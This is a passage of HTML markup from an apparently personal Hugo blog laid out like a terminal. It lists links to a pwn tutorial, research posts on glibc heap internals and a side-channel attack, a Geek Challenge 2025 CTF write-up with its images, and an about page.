+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/How2pwn/0-0-computer_structure data-url=/how2pwn/0-0-computer-structure/></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/research></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/research/large_tcache data-url=/research/glibc-large-tcache/></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/research/perf-side-channel-attack data-url=/research/perf-side-channel-attack/></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/projects></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/ctf></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025 data-url=/ctf/geek-challenge-2025-wp/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-1.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-10.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-11.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-12.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-13.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-14.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-15.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-16.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-17.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-18.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-19.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-2.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-20.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-21.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-22.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-23.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-24.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-25.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-3.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-4.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-5.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-6.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-7.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-8.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-9.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image.png></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/links></i>
+<i data-terminal-entry data-kind=link-data data-path=/home/C0nvR3/workspace/links/friends.json data-url=/links/></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/about data-url=/about/></i></template></section></main></div><footer class=statusbar><span>main</span>
+<span>UTF-8 · Markdown · Hugo</span></footer></body></html>
